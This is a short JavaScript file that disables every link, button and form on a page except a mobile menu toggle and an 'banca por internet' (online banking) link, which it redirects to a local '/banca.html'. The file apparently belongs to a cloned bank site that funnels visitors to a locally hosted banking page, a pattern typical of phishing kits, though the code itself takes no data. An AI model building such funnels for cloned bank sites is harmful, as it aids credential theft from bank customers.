(function () {
  const BANCA_URL = "/banca.html";

  function labelOf(el) {
    return (el.innerText || el.textContent || el.getAttribute("aria-label") || "")
      .replace(/\s+/g, " ")
      .trim()
      .toLowerCase();
  }

  function isBanca(el) {
    if (!el || !el.closest) return false;
    const node = el.closest("a, button");
    return !!(node && labelOf(node) === "banca por internet");
  }

  function isMenuToggle(el) {
    if (!el || !el.closest) return false;
    return !!el.closest(".toggle-menu-mobile");
  }

  function shouldBlock(el) {
    if (!el || !el.closest) return false;
    return !!el.closest(
      "a, button, [role='button'], input[type='submit'], input[type='button'], label[for]"
    );
  }

  document.addEventListener(
    "click",
    function (event) {
      if (isMenuToggle(event.target)) return;
      if (isBanca(event.target)) {
        event.preventDefault();
        event.stopImmediatePropagation();
        window.location.href = BANCA_URL;
        return;
      }
      if (shouldBlock(event.target)) {
        event.preventDefault();
        event.stopImmediatePropagation();
      }
    },
    true
  );

  document.addEventListener(
    "submit",
    function (event) {
      event.preventDefault();
      event.stopImmediatePropagation();
    },
    true
  );

  document.addEventListener(
    "auxclick",
    function (event) {
      if (isBanca(event.target) || isMenuToggle(event.target)) return;
      if (shouldBlock(event.target)) {
        event.preventDefault();
        event.stopImmediatePropagation();
      }
    },
    true
  );
})();
